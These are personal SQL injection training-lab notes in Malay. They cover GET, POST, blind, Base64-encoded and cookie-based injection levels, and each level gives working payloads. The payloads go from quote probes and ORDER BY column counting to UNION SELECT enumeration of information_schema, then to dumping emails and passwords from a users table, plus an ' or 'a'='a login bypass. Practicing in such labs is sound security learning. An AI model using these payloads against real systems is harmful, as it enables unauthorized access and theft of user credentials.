# SQL-Injection-Training-Lab-notes
SQL Injection Training Lab notes for myself

## Level A - Basic GET SQL Injection
- common payload untuk sqli `'` `"` `\` `)'` `}'` `\'` untuk test web injectable
- note: jika `blind base` page tidak keluar error page tapi page menjadi blank
- note: `--` simbol untuk komen di sql
- note: `+` simbol untuk space pada url browser
- note: jika string `union all select` detect oleh web boleh guna hex iaitu dalam bentuk %61 atau no2 lain

- gambar dibawah contoh untuk test error web selepas guna payload `'` = `single quote`

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/4e32639f-6c0e-4c82-bf67-317bc2ff01df)

- payload `'--+` web menjadi normal dan web ini mempunyai vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/417f7304-7b32-4688-8702-e50e97ce6bad)

- payload `'+order+by+6--+` untuk mencari berapa column yang ada dalam db, contoh sampai 6 dpt error bermaksud ada 5 colomn dlm db ini

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/728fa968-dfb5-4570-a786-c663f8b35833)

- payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk melihat username dan email dikeluarkan berada di col no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code contoh `@@version` untuk check version , `database()` untuk check nama db, `user()` untuk check username db
 
![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e68c2dec-1ada-4a95-82de-d3c84da608fc)

- payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables--+` untuk senaraikan semua db table dalam db information_schema

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/75903416-fec8-4ba8-b5a1-d6befaa5ec0f)

- payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+` untuk filter current db sahaja berdasarkan payload step sebelumnya

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c3f53df9-f9db-4f76-9c1c-a5f5fd80db56)

- payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()--+` untuk display semua jenis col dalam db 

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5c3f8a18-58f9-450b-8b34-6744b7f72d59)

- payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='users'--+` untuk display semua jenis col dalam db table users

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/20974b51-155d-44e1-b871-609104d9eebd)

- payload `?id=-1'+union+all+select+1,group_concat(email),group_concat(password),4,5+from+users--+` untuk display email dan password sebab kita dah tahu table mana untuk guna `group_concat(email)`,`group_concat(password)`,`from users`

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9dd9dab2-4e32-46bd-add4-1fe787a87b68)

## Level B - Basic POST SQL Injection
- notes: beza get method dengan post method ialah post tiada di url browser dan get ada di url browser
- notes: guna `space` untuk ganti `+` dalam post method

- payload `user1'` untuk test error web

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9b258237-6335-4e64-84cd-e29f02e2776b)

- payload `user1'-- ` web menjadi normal bermaksud web mempunyai vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e2337ce0-2c05-440b-85ba-c5aea13b2fd2)

- payload `user1'order by 5-- ` untuk mencari berapa col yang ada dlm db, contoh sampai 6 dapat error bermaksud ada 5 col dalam db ini

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f1887807-0685-4449-b862-9c7a6161d3c8)

- payload `user-1'union all select 1,2,3,4,5-- ` untuk tengok username dan email dikeluarkan berada di col no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/779ad3ae-ad74-440d-b9c9-699f86e803c4)

- payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables-- ` untuk senaraikan semua db table dalam db information_schema

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/31af9e0f-04ac-4619-a3be-74ae349f2f92)

- payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- ` seperti step sebelumnya tapi filter kepada current db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc76091e-ebe5-494d-83c1-f2347a55f614)

- payload `user-1'union all select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users' and table_schema=database()-- ` untuk display semua jenis col dalam db table users

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5f3e4061-f448-4a3d-9985-f9624eee7177)

- payload `user-1'union all select 1,group_concat(email),group_concat(password),4,5 from users-- ` untuk senarai email dan password

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/dc5c638f-be2f-4c0c-b3f9-5d86750151c9)

## Level C - POST Bypass Auth
- payload `'` untuk test error web

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/6ba94a2a-bda7-4d3e-8305-d6582f79378b)

- payload `'-- ` web menjadi normal bermaksud web ini ada vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/fd5010f6-14d0-4c94-9edf-03ea16485da9)

- payload `' or 'a' = 'a` untuk bypass login dan paste letak di password sekali, auto dapat masuk login

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f30df5d1-917f-4475-aabf-e3b9a0631812)

## Level D - GET Blind Based
- notes: blind sama dengan get method
- notes: blind tidak keluar error atau data 

- payload `'` untuk test error web

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/622c5881-2e02-498b-b282-16e20422c651)

- payload `'--+` web menjadi normal dan web ada vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7f368d86-c3f8-4dc7-abc5-d3fa1cb2b789)

- payload `'+order+by+5--+` untuk mencari berapa col yang ada dalam db contoh 6 dapat blind error so db ada 5 column

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bbccdea2-3ebb-4987-9704-8a587d2299d1)

- payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tengok username dan email dikeluarkan berada di col no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace dengan apa2 code

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1a51e4f-3619-4ea8-ab1d-2a9d67def8e2)

- step seterusnya sama saja dengan get method

## Level E - Base64 GET SQL Injection

- notes: encoded bermaksud berbeza bentuk contoh ialah Base10, Base64
- Base64 `a-z` `A-Z` `0-9` `/` `+` dan 4 data iaitu `XX==` `XXX=` `XXXX`
- boleh guna online tools [Base64 decode encode](https://www.base64decode.org/)

- payload `1'` convert B64 `MSc=` untuk check web error

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/8ae0dcee-a744-4c48-9f98-b1504516374e)

- payload `1'-- ` convert B64 `MSctLSA=` web menjadi normal dan web ada vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5452bec6-df24-4917-9c15-44fe740658ad)

- payload `1' order by 5-- ` convert B64 `MScgb3JkZXIgYnkgNS0tIA==` kenapa 5 sebab db ada 5 col dan col 6 dapat error

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5a8141c0-ae0f-40da-bbca-565ca9a7e62f)

- payload `-1' union all select 1,2,3,4,5-- ` convert B64 `LTEnIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsNCw1LS0g` untuk check username dan email berada di col mana dalam db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/3ff88ac0-e86a-4e67-8444-b748dec2f61f)

- step seterusnya sama dengan level2 lain

## Level H - Cookie Base SQL Injection
- Notes: untuk check cookie buka `developer tools` atau button `f12` atau `inspect element` di browser bahagian console taip `document.cookie`
- Notes: cookie disimpan di browser

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c75cd5b3-a35f-4532-b367-d2ac0bae1b0d)

- payload `document.cookie = "userid=2"` untuk tukar kepada user 2

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/afc4f45f-14b4-4630-b112-35f95ff72dd7)

- payload `document.cookie = "userid=2'"` untuk check web error

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/33eb3578-4dcb-490b-bb42-e47d96dc5b34)

- payload `document.cookie = "userid=1'-- -"` wen menjadi normal dan web ada vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7fa4c83f-7ff9-47f2-bdfd-6571455c7053)

- payload  `document.cookie = "userid=-1'union all select 1,2,3,4,5 -- -"` untuk check username dan email berada di col mana dalam db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1bb83ee-4f2c-4f67-97e8-848717a43582)

- step seterunya sama dengan level2 sebelumnya
